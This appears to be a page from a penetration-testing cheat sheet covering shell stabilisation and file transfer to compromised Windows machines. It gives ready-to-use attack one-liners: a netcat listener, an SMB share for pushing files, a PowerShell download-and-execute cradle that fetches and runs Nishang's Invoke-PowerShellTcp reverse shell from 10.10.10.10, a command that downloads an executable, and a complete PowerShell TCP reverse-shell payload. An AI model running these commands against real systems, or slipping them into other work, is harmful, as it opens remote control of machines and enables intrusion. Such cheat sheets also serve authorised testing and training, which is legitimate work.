---
sidebar_position: 1
---

# Stabilisation - Transfer


:::caution This Section is a Work In Progress

:::

<br/>

## Stabilisation

- **Common Upload Location:**

```powrshell
C:\Windows\Temp
```

- **Enable Unicode Characters Support**

```batch
chcp 65001
```

- **Shell Stabilisation**

```bash
rlwrap nc -nvlp 8888
```

- **Set Keyboard Layout**

```
Set-WinUserLanguageList -LanguageList en-US -force
```

<br/>

## SMBServer  

- **Transfer Files to Windows with `SMBServer`** 

```bash
smbserver.py SHARE_NAME /DIRECTORY/HOSTING/FILES         # Use [.] to HOST in the Same Directory
```

- **Remote Commands [From the Windows Machine]**

```bash
net view \\10.10.10.10                                   # View Share
dir \\10.10.10.10\LINUXSHARE                             # List Share Contents
copy \\10.10.10.10\LINUXSHARE\FILE_NAME.md FILE_NAME.md  # Copy Files
```

## Python

- **Start Simple `HTTP` Server**

```bash
# Python3
python3 -m http.server 8888 

# Python2
python -m SimpleHTTPServer 8888  
```

<br/>

## PSH

- **Transfering - Executing [One Liner]**

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8888/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444   # [Invoke-PowerShellTcp] - Nishang GIT Repo
```

- **Transfering Files**

```powershell
powershell (New-Object System.Net.WebClient).Downloadfile('http://10.10.10.10:8888/FileName.exe','FileName.exe')
```

- **Reverse Shell [It may be Necessary to Encode the PAYLOAD in `URL` Format]**

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```